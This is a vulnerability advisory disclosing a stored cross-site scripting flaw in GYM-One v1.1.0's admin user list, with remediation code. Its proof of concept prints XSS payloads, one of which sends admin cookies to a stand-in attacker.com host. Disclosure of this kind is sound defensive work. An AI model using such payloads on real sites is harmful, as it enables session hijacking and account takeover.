# CVE-2026-55872 — Stored XSS in GYM-One v1.1.0

| Field            | Value                                                                        |
|------------------|------------------------------------------------------------------------------|
| Product          | [GYM-One](https://github.com/mayerbalintdev/GYM-One)                        |
| Version          | v1.1.0                                                                       |
| File             | `admin/users/index.php`                                                      |
| CVE              | CVE-2026-55872                                                         |
| CWE              | CWE-79 — Improper Neutralization of Input During Web Page Generation         |
| CVSS 3.1 Vector  | AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N                                         |
| CVSS Score       | 8.7 (High)                                                                   |
| Auth Required    | Yes (user registration)                                                      |
| Discovered by    | Lennart Hostettler                                                           |
| Date             | 12/06/2026                                                                   |

## Description

GYM-One v1.1.0 is vulnerable to Stored Cross-Site Scripting in `admin/users/index.php`.
The fields `firstname`, `lastname`, and `email` from the `users` table are rendered directly
into HTML without `htmlspecialchars()` or any output encoding:

```php
echo "<td>" . $row["firstname"] . "</td>"; // line 409
echo "<td>" . $row["lastname"] . "</td>";  // line 410
echo "<td>" . $row["email"];               // line 411
```

A registered user can inject arbitrary HTML/JavaScript into their profile fields. The payload
executes in the browser of any admin who visits `/admin/users/`.

## Proof of Concept

**Step 1 — Inject payload via registration**

Register a new user with the following `firstname`:

```html
<img src=x onerror=alert(1)>
```

For session hijacking:

```html
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

**Step 2 — Trigger**

Admin navigates to:

```http
GET /admin/users/
```

Result: The injected script executes in the admin's browser context.

## Impact

- **Admin session hijacking** via cookie exfiltration → full account takeover
- **Credential theft** by injecting a fake login overlay
- **Persistent** — payload fires for every admin who opens the user list until the record is deleted

## Remediation

Wrap all database output in `htmlspecialchars()` before rendering:

```php
echo "<td>" . htmlspecialchars($row["firstname"], ENT_QUOTES, 'UTF-8') . "</td>";
echo "<td>" . htmlspecialchars($row["lastname"],  ENT_QUOTES, 'UTF-8') . "</td>";
echo "<td>" . htmlspecialchars($row["email"],     ENT_QUOTES, 'UTF-8') . "</td>";
```
